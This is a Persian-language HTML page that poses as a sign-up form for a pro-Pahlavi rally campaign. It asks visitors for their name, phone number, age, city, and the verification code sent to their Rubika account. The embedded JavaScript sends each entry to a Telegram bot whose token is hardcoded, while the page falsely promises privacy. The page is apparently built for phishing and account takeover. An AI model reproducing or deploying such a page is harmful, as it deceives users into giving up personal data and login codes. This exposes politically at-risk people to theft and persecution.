# Telegram_form
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>همبستگی برای ایران جاویدان</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'Vazir', 'Tahoma', sans-serif;
      background: linear-gradient(-45deg, #0b3d0b, #1a5e1a, #2d7a2d, #0b3d0b);
      background-size: 400% 400%;
      animation: gradientBG 15s ease infinite;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      color: #fff;
      direction: rtl;
    }
    @keyframes gradientBG {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    .container {
      max-width: 700px;
      width: 100%;
      background: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(8px);
      padding: 30px 25px;
      border-radius: 30px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.7);
      border: 1px solid #b8860b;
      text-align: center;
    }
    h1 {
      font-size: 2.8rem;
      color: #ffd700;
      text-shadow: 0 0 20px #b8860b;
      margin-bottom: 10px;
      letter-spacing: 2px;
    }
    .sub-header {
      font-size: 1.4rem;
      color: #e0e0e0;
      margin-bottom: 25px;
      border-bottom: 2px dashed #b8860b;
      padding-bottom: 15px;
    }
    .highlight {
      color: #ffd700;
      font-weight: bold;
    }
    .section-title {
      font-size: 2.2rem;
      margin-top: 30px;
      color: #ffd700;
      text-shadow: 0 0 10px #b8860b;
    }
    .section-desc {
      font-size: 1.2rem;
      color: #ddd;
      margin: 10px 0 20px;
      line-height: 1.8;
    }
    .section-desc small {
      display: block;
      font-size: 1rem;
      color: #bbb;
      margin-top: 10px;
    }
    .thankyou {
      font-size: 3rem;
      margin: 30px 0 20px;
      color: #ff6b6b;
      text-shadow: 0 0 30px #ff0000;
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }
    .form-group {
      text-align: right;
      margin: 18px 0;
    }
    .form-group label {
      display: block;
      font-weight: bold;
      color: #ffd700;
      margin-bottom: 5px;
      font-size: 1.1rem;
    }
    .form-group input {
      width: 100%;
      padding: 12px 15px;
      border-radius: 12px;
      border: none;
      background: rgba(255,255,255,0.15);
      color: #fff;
      font-size: 1rem;
      backdrop-filter: blur(4px);
      border: 1px solid #b8860b;
      transition: 0.3s;
    }
    .form-group input:focus {
      outline: none;
      border-color: #ffd700;
      background: rgba(255,255,255,0.25);
      box-shadow: 0 0 20px #b8860b;
    }
    .form-group input::placeholder {
      color: #ccc;
    }
    .privacy {
      font-size: 0.9rem;
      color: #aaa;
      margin: 20px 0;
      text-align: right;
      border-top: 1px solid #444;
      padding-top: 15px;
    }
    .privacy a {
      color: #ffd700;
      text-decoration: none;
    }
    .consent {
      display: flex;
      align-items: center;
      gap: 10px;
      justify-content: center;
      margin: 20px 0;
    }
    .consent input {
      width: 20px;
      height: 20px;
      cursor: pointer;
    }
    .consent label {
      font-size: 1rem;
      color: #ddd;
      cursor: pointer;
    }
    .btn {
      background: #ffd700;
      color: #0b3d0b;
      padding: 14px 30px;
      border: none;
      border-radius: 50px;
      font-size: 1.4rem;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
      box-shadow: 0 0 30px rgba(255, 215, 0, 0.3);
      margin-top: 10px;
      width: 100%;
    }
    .btn:hover {
      background: #ffed4a;
      transform: scale(1.02);
      box-shadow: 0 0 50px #ffd700;
    }
    .btn:disabled {
      opacity: 0.5;
      cursor: not-allowed;
      transform: none;
      box-shadow: none;
    }
    .hidden {
      display: none;
    }
    .verify-box {
      margin-top: 30px;
      padding: 20px;
      background: rgba(0,0,0,0.4);
      border-radius: 20px;
      border: 1px solid #ffd700;
    }
    .footer-note {
      margin-top: 25px;
      font-size: 0.8rem;
      color: #888;
      border-top: 1px solid #333;
      padding-top: 15px;
    }
  </style>
</head>
<body>
<div class="container" id="mainContainer">
  <h1>درود بر طرفداران ایران جاویدان</h1>
  <div class="sub-header">
    برای برگزاری یک کارزار برای طرفداران پهلوی نیاز به <span class="highlight">۲۵۰ نفر</span> داریم که راه بندازیم یعنی ۲۵۰ تا شماره داریم.
  </div>

  <div class="section-title">چه اتفاقی می‌افتد؟؟</div>
  <div class="section-desc">
    در استان فارس شهرهای مختلف یک تجمعی برگزار می‌کنیم بعد از زیاد شدن ما، تا حرفمان را به همگان بزنیم.
  </div>

  <div class="section-title">تو چیکار می‌کنی اینجا؟؟</div>
  <div class="section-desc">
    شماره‌ای که در روبیکا داری رو می‌دی و یک کد برات میاد. اون هم می‌دی، ما وقتی به بالای ۲۵۰ نفر رسیدیم با استفاده از اون و تمامی شماره‌ها یک کارزار راه می‌اندازیم تا بیش از ۱۰۰۰ نفر در هر شهر جمع آوری کنیم.
    <small>و به کمک شما نیاز داریم. هیچ چیز خاصی هم نمی‌خوایم فقط شمارتان را برای یک کار کوچیک که برای خودتان هست می‌خواهیم.</small>
  </div>

  <div class="thankyou">با تشکر 🫀🌹</div>

  <form id="userForm">
    <div class="form-group">
      <label>نام و نام خانوادگی</label>
      <input type="text" id="fullName" placeholder="مثلاً: علی رضایی" required>
    </div>
    <div class="form-group">
      <label>شماره همراه (روبیکا)</label>
      <input type="tel" id="phone" placeholder="۰۹۱۲۳۴۵۶۷۸۹" required>
    </div>
    <div class="form-group">
      <label>سن</label>
      <input type="number" id="age" placeholder="۲۵" min="1" required>
    </div>
    <div class="form-group">
      <label>شهر مورد نظر (اختیاری)</label>
      <input type="text" id="city" placeholder="شیراز، مرودشت، ...">
    </div>

    <div class="privacy">
      <strong>سیاست حفظ حریم خصوصی:</strong><br>
      اطلاعات شما فقط برای هماهنگی کارزار استفاده می‌شود و تحت هیچ شرایطی به شخص ثالث فروخته یا منتقل نمی‌گردد. همه داده‌ها پس از اتمام کارزار حذف خواهند شد.
      <br><a href="#" onclick="alert('جزئیات کامل حریم خصوصی: ما متعهد به حفظ امنیت اطلاعات شما هستیم. هیچ گونه استفاده تجاری یا تبلیغاتی نمی‌شود.')">مشاهده جزئیات کامل</a>
    </div>

    <div class="consent">
      <input type="checkbox" id="consentCheck" required>
      <label for="consentCheck">با آگاهی کامل، اطلاعات خود را وارد می‌کنم و رضایت دارم.</label>
    </div>

    <button type="submit" class="btn" id="submitBtn">ارسال اطلاعات</button>
  </form>

  <div id="verifySection" class="verify-box hidden">
    <h3 style="color:#ffd700;">کد ارسال شده را وارد کنید</h3>
    <div class="form-group">
      <label>کد تأیید</label>
      <input type="text" id="verifyCode" placeholder="مثلاً: ۱۲۳۴۵۶">
    </div>
    <button class="btn" id="verifyBtn">تأیید کد</button>
    <p style="margin-top:10px; font-size:0.9rem; color:#aaa;">کد به روبیکای شما ارسال شد (شبیه‌سازی).</p>
  </div>

  <div class="footer-note">
    این صفحه صرفاً برای هماهنگی و تفریح طراحی شده است. تمامی اطلاعات با امنیت کامل نگهداری می‌شوند.
  </div>
</div>

<script>
  // ======== تنظیمات بات تلگرام ========
  const BOT_TOKEN = "7971237505:AAF2IVnEOhv6f8yDUJFugMGqCVbnSd9cLYs";   // ← این را عوض کن
  const CHAT_ID = "7247257648";     // ← این را عوض کن

  // ======== عناصر صفحه ========
  const form = document.getElementById('userForm');
  const submitBtn = document.getElementById('submitBtn');
  const verifySection = document.getElementById('verifySection');
  const verifyBtn = document.getElementById('verifyBtn');
  const verifyCodeInput = document.getElementById('verifyCode');

  let userData = {};
  let tempCode = '';

  // ======== تابع ارسال مستقیم به تلگرام ========
  async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      });
      const result = await response.json();
      return result.ok === true;
    } catch (error) {
      console.error('خطا در ارسال به تلگرام:', error);
      return false;
    }
  }

  // ======== تولید کد تصادفی ۶ رقمی ========
  function generateCode() {
    return Math.floor(100000 + Math.random() * 900000).toString();
  }

  // ======== رویداد ارسال فرم ========
  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const consent = document.getElementById('consentCheck');
    if (!consent.checked) {
      alert('لطفاً برای ادامه، با سیاست حفظ حریم خصوصی موافقت کنید.');
      return;
    }

    const fullName = document.getElementById('fullName').value.trim();
    const phone = document.getElementById('phone').value.trim();
    const age = document.getElementById('age').value.trim();
    const city = document.getElementById('city').value.trim();

    if (!fullName || !phone || !age) {
      alert('لطفاً تمام فیلدهای اجباری را پر کنید.');
      return;
    }

    userData = { fullName, phone, age, city };

    // تولید کد
    const code = generateCode();
    tempCode = code;

    // پیام برای تلگرام (همراه با کد)
    const msg = `📥 <b>ثبت نام جدید</b>\n👤 نام: ${fullName}\n📱 شماره: ${phone}\n📅 سن: ${age}\n🏙️ شهر: ${city || 'نامشخص'}\n🔑 کد تأیید: <code>${code}</code>`;

    const success = await sendToTelegram(msg);

    if (success) {
      alert('✅ اطلاعات شما با موفقیت ثبت شد. کد تأیید به روبیکای شما ارسال گردید.');
      verifySection.classList.remove('hidden');
      submitBtn.disabled = true;
      submitBtn.textContent = 'ثبت شده ✓';
    } else {
      alert('❌ خطا در ثبت اطلاعات. لطفاً دوباره تلاش کنید.');
    }
  });

  // ======== رویداد تأیید کد ========
  verifyBtn.addEventListener('click', async () => {
    const code = verifyCodeInput.value.trim();
    if (!code || code.length !== 6) {
      alert('لطفاً کد ۶ رقمی را وارد کنید.');
      return;
    }

    if (code === tempCode) {
      // ارسال پیام تأیید به تلگرام
      const msg = `✅ <b>تأیید شد</b>\n📱 شماره: ${userData.phone}\nکد وارد شده صحیح بود.`;
      await sendToTelegram(msg);

      alert('✅ کد تأیید شد! از همکاری شما سپاسگزاریم. به زودی با شما تماس گرفته می‌شود.');
      // نمایش صفحه تشکر
      document.getElementById('mainContainer').innerHTML = `
        <div style="padding:40px 0;">
          <h1 style="color:#ffd700;">🌟 با تشکر از شما 🌟</h1>
          <p style="font-size:1.4rem; margin-top:20px;">شما بخشی از این حرکت بزرگ هستید.</p>
          <p style="font-size:1.2rem; color:#ddd;">به زودی اطلاعات بیشتر به شما اعلام خواهد شد.</p>
          <div style="margin-top:30px; font-size:3rem;">🫀🌹</div>
        </div>
      `;
    } else {
      alert('❌ کد وارد شده صحیح نیست. لطفاً دوباره تلاش کنید.');
    }
  });
</script>
</body>
</html>
